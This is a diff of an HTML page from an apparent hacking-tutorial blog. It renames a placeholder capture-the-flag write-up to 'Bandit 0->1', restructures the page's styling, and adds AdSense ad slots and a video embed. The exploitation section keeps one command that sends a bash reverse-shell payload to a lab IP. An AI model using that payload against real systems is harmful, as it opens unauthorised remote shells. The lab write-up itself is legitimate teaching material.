@@ -2,142 +2,68 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>How I Rooted "VulnBox01" - Blog</title>
+  <title>Bandit 0->1</title>
   <link rel="stylesheet" href="style.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    body {
-      background-color: #0f0f0f;
-      color: #00ff00;
-      font-family: 'Courier New', Courier, monospace;
-      font-size: 1.2rem;
-      margin: 0;
-      padding: 2rem;
-    }
+  
+  <!-- Google AdSense Script -->
+  <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" crossorigin="anonymous"></script>
 
-    .blog-title {
-      text-align: center;
-      font-size: 3rem;
-      margin-bottom: 2rem;
-      color: #00ff00;
-    }
-
-    .blog-section {
-      margin-bottom: 2rem;
-    }
-
-    .blog-subtitle {
-      font-size: 1.5rem;
-      margin-bottom: 0.5rem;
-      border-bottom: 1px solid #00ff00;
-      padding-bottom: 0.3rem;
-    }
-
-    .blog-text {
-      margin-bottom: 1rem;
-      line-height: 1.7;
-    }
-
-    .blog-code {
-      background-color: #111;
-      color: #00ff00;
-      padding: 1rem;
-      border-left: 4px solid #00ff00;
-      border-radius: 5px;
-      overflow-x: auto;
-      font-family: monospace;
-    }
-
-    .blog-image {
-      display: block;
-      max-width: 100%;
-      border: 2px solid #00ff00;
-      border-radius: 6px;
-      margin: 1rem auto;
-    }
-
-    footer {
-      text-align: center;
-      padding: 2rem;
-      background-color: #0a0a0a;
-      border-top: 2px solid #00ff00;
-      color: #00ff00;
-      font-family: monospace;
-    }
-
-    footer a {
-      color: #00ff00;
-      margin: 0 10px;
-      text-decoration: none;
-      font-size: 1.2rem;
-    }
-
-    footer a i {
-      font-size: 1rem;
-    }
-
-    footer a:hover {
-      color: #00dd00;
-    }
-    .blog-container {
-        max-width: 900px;
-        margin: 0 auto;
-        padding: 0 2rem;
-     }
-     header {
-  background-color: #000;
-  padding: 1rem;
-  border-bottom: 2px solid #00ff00;
-  text-align: center;
-  font-family: monospace;
-}
-
-header h1 {
-  color: #00ff00;
-  margin: 0;
-}
-
-nav {
-  margin-top: 1rem;
-}
-
-nav a {
-  color: #00ff00;
-  margin: 0 15px;
-  text-decoration: none;
-  font-size: 1.2rem;
-}
-
-nav a:hover {
-  color: #00dd00;
-  text-decoration: underline;
-}
-.ad-container {
-  margin: 2rem auto;
-  text-align: center;
-}
-
-
-
-  </style>
 </head>
+
 <body>
+
+<!-- Left Vertical Ad -->
+<div class="vertical-ad left-ad">
+  <ins class="adsbygoogle"
+       style="display:block;width:160px;height:600px"
+       data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+       data-ad-slot="1111111111"></ins>
+  <script>
+       (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+</div>
+
+<!-- Right Vertical Ad -->
+<div class="vertical-ad right-ad">
+  <ins class="adsbygoogle"
+       style="display:block;width:160px;height:600px"
+       data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+       data-ad-slot="2222222222"></ins>
+  <script>
+       (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+</div>
+
 <!-- Header -->
 <header>
-    <h1>💻 Hacker Collective</h1>
-    <nav>
-      <a href="/index.html">Home</a>
-      <a href="/whoami.html">About</a>
-      <a href="https://hmcyberacademy.com/" target="_blank">GitHub</a>
-    </nav>
-  </header>
-<div class="blog-container">
-  <!-- Blog Title -->
-  <h1 class="blog-title">How I Rooted VulnBox01</h1>
+  <h1>💻 TORHAT</h1>
+  <nav>
+    <a href="/index.html">Home</a>
+    <a href="/whoami.html">About</a>
+    <a href="https://hmcyberacademy.com/" target="_blank">GitHub</a>
+  </nav>
+</header>
 
-  <!-- Blog Body -->
+<!-- Blog Container -->
+<div class="blog-container">
+
+  <h1 class="blog-title">Bandit 0->1</h1>
+
   <div class="blog-section">
-    <h2 class="blog-subtitle">🔍 Reconnaissance</h2>
+    <div class="video-wrapper">
+      <iframe 
+        class="vid-center" 
+        src="https://www.youtube.com/embed/-HwLALmQdqg?si=nLU2m1-3UxwDih36" 
+        title="YouTube video player" 
+        frameborder="0" 
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+        referrerpolicy="strict-origin-when-cross-origin" 
+        allowfullscreen>
+      </iframe>
+    </div>
+
+    <h2 class="blog-subtitle first-subtitle">🔍 Reconnaissance</h2>
     <p class="blog-text">
       I started with an Nmap scan to identify open ports and services running on the machine.
     </p>
@@ -146,25 +72,20 @@ nav a:hover {
     </div>
     <img src="images/nmap-output.jpg" alt="Nmap Scan" class="blog-image">
   </div>
-  <!-- Ad Here -->
-  <div class="ad-container">
-    <!-- Google AdSense code pasted here -->
-    <!-- Google AdSense -->
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"
-    crossorigin="anonymous"></script>
 
+  <!-- Horizontal Ad after first section -->
+  <div class="horizontal-ad">
     <ins class="adsbygoogle"
-    style="display:block; text-align:center;"
-    data-ad-client="ca-pub-XXXXXXXXXXXXXXXX"
-    data-ad-slot="1234567890"
-    data-ad-format="auto"
-    data-full-width-responsive="true"></ins>
-
+         style="display:block"
+         data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+         data-ad-slot="3333333333"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
     <script>
-    (adsbygoogle = window.adsbygoogle || []).push({});
+         (adsbygoogle = window.adsbygoogle || []).push({});
     </script>
-
   </div>
+
   <div class="blog-section">
     <h2 class="blog-subtitle">💥 Exploitation</h2>
     <p class="blog-text">
@@ -174,6 +95,19 @@ nav a:hover {
 <pre><code>python exploit.py --url http://10.10.10.123 --payload 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'</code></pre>
     </div>
     <img src="images/nmap-output.jpg" alt="Exploit Screenshot" class="blog-image">
+  </div>
+
+  <!-- Horizontal Ad after second section -->
+  <div class="horizontal-ad">
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+         data-ad-slot="4444444444"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
   </div>
 
   <div class="blog-section">
@@ -188,23 +122,36 @@ nav a:hover {
       Using `GTFObins`, I escalated to root.
     </p>
   </div>
+
+  <!-- Horizontal Ad after third section -->
+  <div class="horizontal-ad">
+    <ins class="adsbygoogle"
+         style="display:block"
+         data-ad-client="ca-pub-xxxxxxxxxxxxxxxx"
+         data-ad-slot="5555555555"
+         data-ad-format="auto"
+         data-full-width-responsive="true"></ins>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+  </div>
+
   <div class="blog-section">
     <h2 class="blog-subtitle">Conclusion</h2>
     <p class="blog-text">
         Now you know how to write a blog. Happy hacking!
-      </p>
-
-    </div>
+    </p>
+  </div>
 </div>
-  <!-- Footer -->
 
-  <footer>
-    <p>Contact me:</p>
-    <a href="https://twitter.com/@TOR_HAT" target="_blank"><i class="fab fa-twitter"></i></a>
-    <a href="https://www.linkedin.com/in/mukesh-pyda/" target="_blank"><i class="fab fa-linkedin"></i></a>
-    <a href="mailto:support@hmcyberacademy.com"><i class="fas fa-envelope"></i></a>
-    <p>&copy; 2025 HMCyberAcademy</p>
-  </footer>
+<!-- Footer -->
+<footer>
+  <p>Contact me:</p>
+  <a href="https://twitter.com/@TOR_HAT" target="_blank"><i class="fab fa-twitter"></i></a>
+  <a href="https://www.linkedin.com/in/mukesh-pyda/" target="_blank"><i class="fab fa-linkedin"></i></a>
+  <a href="mailto:support@hmcyberacademy.com"><i class="fas fa-envelope"></i></a>
+  <p>&copy; 2025 HMCyberAcademy</p>
+</footer>
 
 </body>
 </html>
